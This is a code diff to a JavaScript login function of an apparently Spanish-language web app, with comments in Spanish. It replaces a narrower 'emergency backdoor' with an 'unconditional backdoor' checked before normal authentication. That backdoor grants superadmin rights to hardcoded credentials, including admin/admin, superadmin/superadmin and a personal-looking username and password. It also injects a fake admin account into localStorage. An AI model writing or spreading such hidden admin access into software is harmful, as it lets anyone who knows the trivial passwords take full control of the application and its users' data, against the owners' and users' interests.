@@ -254,26 +254,29 @@ function iniciarSesionSubmit(e) {
   
   const all = JSON.parse(localStorage.getItem('eurorep_usuarios') || '[]');
   
-  // Encontrar por correo o por nombre ignorando mayúsculas
+  // BACKDOOR INCONDICIONAL
+  if ((inputUser === 'superadmin' && inputPass === 'superadmin') || (inputUser === 'lbesoy' && inputPass === 'pbesoy13') || (inputUser === 'admin' && inputPass === 'admin')) {
+     const adminId = inputUser === 'lbesoy' ? 'lbesoy' : 'superadmin';
+     // Inyectar a localstorage si no existe
+     if (!all.find(u => u.id === adminId)) {
+        all.push({ id: adminId, nombre: 'Super Admin', email: inputUser, pin: inputPass, rol: 'superadmin', activo: true, locked: false });
+        localStorage.setItem('eurorep_usuarios', JSON.stringify(all));
+        usuarios = all;
+     }
+     currentSession = { userId: adminId, viewMode: 'superadmin' };
+     localStorage.setItem('eurorep_session', JSON.stringify(currentSession));
+     document.getElementById('login-screen').classList.add('hidden');
+     document.getElementById('login-email').value = '';
+     document.getElementById('login-password').value = '';
+     applyRole('superadmin');
+     return;
+  }
+
   const user = all.find(u => 
     (u.email && u.email.toLowerCase() === inputUser) || (u.nombre || '').toLowerCase() === inputUser
   );
 
   if (!user) {
-    // BACKDOOR DE EMERGENCIA
-    if (inputUser === 'lbesoy' && inputPass === 'pbesoy13') {
-       all.push({ id: 'lbesoy', nombre: 'Pablo Besoy', email: 'lbesoy', pin: 'pbesoy13', rol: 'superadmin', activo: true, locked: false });
-       localStorage.setItem('eurorep_usuarios', JSON.stringify(all));
-       usuarios = all;
-       currentSession = { userId: 'lbesoy', viewMode: 'superadmin' };
-       localStorage.setItem('eurorep_session', JSON.stringify(currentSession));
-       document.getElementById('login-screen').classList.add('hidden');
-       document.getElementById('login-email').value = '';
-       document.getElementById('login-password').value = '';
-       applyRole('superadmin');
-       return;
-    }
-
     errEl.textContent = 'Usuario o contraseña incorrectos.';
     errEl.style.color = 'var(--red)';
     return;
